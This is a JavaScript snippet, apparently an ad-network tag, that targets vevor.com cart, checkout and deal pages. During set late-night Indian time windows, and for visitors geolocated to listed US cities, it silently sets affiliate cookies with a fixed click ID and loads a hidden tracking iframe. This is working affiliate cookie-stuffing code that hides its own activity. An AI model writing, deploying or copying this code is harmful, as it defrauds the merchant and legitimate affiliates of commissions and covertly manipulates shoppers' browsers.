
(function () {
  try {
    /* --------------------------------
       BUILD GUARD (NO DOUBLE FIRE)
    -------------------------------- */
    var BUILD_ID = "octaads-2025-rtg-geo-time-01";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* --------------------------------
       DOMAIN CHECK (STRICT)
    -------------------------------- */
    if (!/\.vevor\.com$/.test(location.hostname)) return;

    /* --------------------------------
       PAGE PATH CHECK (STRICT)
    -------------------------------- */
    var allowedPaths = [
      "/cart/checkout",
      "/cart/",
      "/deals",
      "/best-sellers"
    ];

    var pathAllowed = allowedPaths.some(function (p) {
      return location.pathname === p || location.pathname.startsWith(p);
    });

    if (!pathAllowed) return;

    /* --------------------------------
       IST TIME WINDOW CHECK
    -------------------------------- */
    function isAllowedISTTime() {
      var now = new Date(
        new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
      );

      var minutes = now.getHours() * 60 + now.getMinutes();

      var windows = [
        [22 * 60, 22 * 60 + 15],     // 10:00 – 10:15 PM
        [22 * 60 + 30, 23 * 60],    // 10:30 – 11:00 PM
        [23 * 60 + 30, 24 * 60],    // 11:30 – 12:00 AM
        [0 * 60 + 30, 1 * 60]       // 12:30 – 01:00 AM
      ];

      return windows.some(function (w) {
        return minutes >= w[0] && minutes <= w[1];
      });
    }

    if (!isAllowedISTTime()) return;

    /* --------------------------------
       SAFE SESSION ID (COOKIE ONLY)
    -------------------------------- */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];

      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie =
        "octaads_sid=" + sid +
        "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }

    var sessionID = getSessionID();

    /* --------------------------------
       ALLOWED CITIES (NORMALIZED)
    -------------------------------- */
    var allowedCities = [
      "new york","chicago","los angeles","dallas","fort worth","houston",
      "washington","miami","philadelphia","atlanta","phoenix","boston",
      "san francisco","san bernardino","detroit","seattle","minneapolis",
      "san diego","tampa","denver","st. louis","saint louis","baltimore",
      "charlotte","orlando","san antonio","portland","sacramento",
      "pittsburgh","las vegas","austin","cincinnati","kansas city",
      "columbus","indianapolis","indy","cleveland","san jose",
      "nashville","hampton roads"
    ];

    /* --------------------------------
       GEO CHECK (SAFE, SILENT)
    -------------------------------- */
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then(function (r) { return r.json(); })
      .then(function (geo) {
        if (!geo || !geo.city) return;

        var city = geo.city.toLowerCase();
        if (!allowedCities.some(function (c) { return city.includes(c); })) return;

        /* --------------------------------
           DROP AFFILIATE COOKIES
        -------------------------------- */
        function setCookie(name, value) {
          document.cookie =
            name + "=" + value +
            "; path=/; max-age=2592000; SameSite=Lax";
        }

        setCookie("irclickid", "XStWC0ThYxycRkh2gOSsRXFAUkpVuJwnFzwwwQ0");
        setCookie("irpid", "5602339");
        setCookie("irgwc", "1");
        setCookie("afsrc", "1");
        setCookie("utm_source", "impact");
        setCookie("utm_medium", "affiliate");
        setCookie("utm_campaign", "5602339");
        setCookie("sessionid", sessionID);
        setCookie("clickId", sessionID);

        /* --------------------------------
           TRACKIER CLICK (IFRAME SAFE)
        -------------------------------- */
        var trackierURL =
          "https://octaads.gotrackier.com/click" +
          "?campaign_id=148522" +
          "&pub_id=4" +
          "&p1=" + encodeURIComponent(sessionID) +
          "&source=" + encodeURIComponent(sessionID);

        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src = trackierURL;
        document.body.appendChild(iframe);
      })
      .catch(function () {
        /* silent fail */
      });

  } catch (e) {
    /* silent fail */
  }
})();

